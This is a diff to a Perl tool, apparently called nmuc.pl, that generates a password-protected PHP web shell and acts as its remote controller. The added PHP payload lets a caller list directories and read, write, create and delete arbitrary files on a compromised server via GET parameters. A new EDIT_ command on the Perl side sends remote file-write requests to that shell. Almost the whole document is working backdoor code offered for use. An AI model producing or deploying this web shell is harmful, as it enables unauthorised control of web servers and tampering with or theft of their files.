@@ -6,7 +6,7 @@ use Getopt::Long;
 use Digest::MD5 qw(md5_hex);
 
 $deffy0h="Deffy0h";
-$code="Deffy0h-CODE:a0b91d8e06136094e4e9f2633d219324";
+$code="deffy0h";
 my $OK_HTTP=200;
 my $RE_ERRO="ERRO0";
 
@@ -39,6 +39,7 @@ my $auth="";
 my $path="";
 my $lastFolder="";
 my $lj="";
+my $hem="";
 
 GetOptions("opt=s"=>\$op);
 
@@ -56,17 +57,16 @@ CREN();
 
 sub CREN(){
 my $file="Shell.php";
-my $strCODE="hei";
 print "FILE: ";
 $file=<STDIN>;
+chomp($file);
 if($file!~m/.php$/){
 $file="Shell.php";
 }
 
-open($a,">",$file) or die("[-] ERRO\n");
-
 print "PASSWORD: ";
 $p=<STDIN>;
+chomp($p);
 unless($p){
 print "[-] PASSWORD=''\n";
 exit;
@@ -77,7 +77,94 @@ $p=md5_hex($p);
 print "[+] FILE=> $file\n";
 print "[+] PASSWORD=> $p\n";
 
-$a->print($strCODE);
+my $ex_password=chr(36)."password";
+my $ex_code=chr(36)."code";
+my $ex_GET=chr(36)."_GET";
+my $ex_p=chr(36)."p";
+my $ex_code_=chr(36)."code_";
+my $ex_type=chr(36)."type";
+my $ex_path=chr(36)."path";
+my $ex_text=chr(36)."text";
+my $ex_f=chr(36)."f";
+my $ex_r=chr(36)."r";
+my $ex_dir=chr(36)."dir";
+
+my $er_e=chr(91);
+my $er_ee=chr(93);
+
+$mmh="
+<?php 
+
+#-=================================================-
+#		   Create By Deffy0h/nmuc.pl					
+#-=================================================-
+
+$ex_password='$p';
+$ex_code='$code';
+
+if(!isset($ex_GET $er_e 'p' $er_ee )){exit;}$ex_p=$ex_GET $er_e 'p' $er_ee ;
+if(!isset($ex_GET $er_e 'code' $er_ee )){exit;}$ex_code_=$ex_GET $er_e 'code' $er_ee ;
+if($ex_code_!=$ex_code){exit;}
+if($ex_password!=$ex_p){echo 'ERRO0'; exit;}
+
+if(isset($ex_GET $er_e 'type' $er_ee )){$ex_type=$ex_GET $er_e 'type' $er_ee ;}else{exit;}
+if($ex_type=='dir'){
+DIR_();
+}
+if($ex_type=='open'){
+OPEN_();
+}
+if($ex_type=='mkdir'){
+MKDIR_();
+}
+if($ex_type=='del'){
+DEL_();
+}
+if($ex_type=='edit'){
+EDIT_();
+}
+
+function EDIT_(){
+if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
+if(!isset($ex_GET $er_e 'text' $er_ee )){exit;}$ex_text=$ex_GET $er_e 'text' $er_ee ;
+$ex_f=fopen($ex_path,'w') or die('e1');
+fwrite($ex_f,$ex_text);
+fclose($ex_f);
+}
+
+function DEL_(){
+if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
+if(!is_dir($ex_path)){
+unlink($ex_path);
+exit;
+}
+rmdir($ex_path);
+}
+
+function MKDIR_(){
+if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
+mkdir($ex_path,773,true);
+}
+
+function OPEN_(){
+if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
+$ex_f=fopen($ex_path,'r') or die('e1');
+$ex_r=fread($ex_f,filesize($ex_path));
+fclose($ex_f);
+echo $ex_r;
+}
+
+function DIR_(){
+if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
+$ex_dir=scandir($ex_path);
+print_r($ex_dir);
+}
+
+?>
+";
+
+open($a,">",$file);
+$a->print($mmh);
 $a->close();
 
 print "[+] FILE $file SAVED\n\n";
@@ -176,7 +263,40 @@ CREATE_FOLDER();
 if($command eq "del"){
 DEL_();
 }
-if($command ne "dir" || $command ne "cls" || $command ne "exit" || $command ne "open" || $command ne "mkdir" || $command ne "del"){RETN();}
+if($command eq "edit"){
+EDIT_();
+}
+if($command eq "create"){
+EDIT_();
+}
+if($command ne "dir" || $command ne "cls" || $command ne "exit" || $command ne "open" || $command ne "mkdir" || $command ne "del" || $command ne "edit"){RETN();}
+
+}
+
+sub EDIT_(){
+
+print "PATH=> ";
+$path=<STDIN>;
+chomp($path);
+
+print "TEXT=> ";
+$hem=<STDIN>;
+chomp($hem);
+
+$gh=$auth."&type=edit&path=".$path."&text=".$hem;
+
+print $gh."\n";
+print $hem;
+
+if($re=HTTP::Request->new(GET=>$gh)){
+$response=$ua->request($re);
+if($response->status_line==$OK_HTTP){
+$htm=$response->decoded_content;
+if($htm eq ""){
+print "\n\n[+] $path EDITED WITH SUCCESS\n\n";
+}
+}
+}
 
 }
 
@@ -222,8 +342,7 @@ if($path!~m/./){
 $path="/".$path."/";
 }
 
-$u_files=$auth."&type=files"."&path=".$path;
-
+$u_files=$auth."&type=dir"."&path=".$path;
 if($re=HTTP::Request->new(GET=>$u_files)){
 $response=$ua->request($re);
 if($response->status_line==$OK_HTTP){
@@ -268,6 +387,7 @@ $save="index.php";
 }
 
 $uu_files=$auth."&type=open&path=".$path;
+chomp($u_files);
 
 if($re=HTTP::Request->new(GET=>$uu_files)){
 $response=$ua->request($re);
